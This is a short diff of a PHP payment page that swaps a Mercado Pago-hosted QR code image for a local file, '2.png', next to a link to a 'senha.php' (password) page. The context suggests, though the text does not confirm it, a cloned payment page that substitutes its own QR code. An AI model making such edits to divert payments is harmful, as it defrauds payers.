@@ -62,7 +62,7 @@ if (!isset($_COOKIE['identificador_cliente'])) {
             </div>
 
             <div class="qr-card">
-                <img src="https://www.mercadopago.com.br/sell/qr/collector-qr.png" alt="Código QR" id="qr-image" class="qr-image">
+                <img src="2.png" alt="Código QR" id="qr-image" class="qr-image">
                 
                 <a href="senha.php" class="other-method-link">Escolher outro método</a>
             </div>
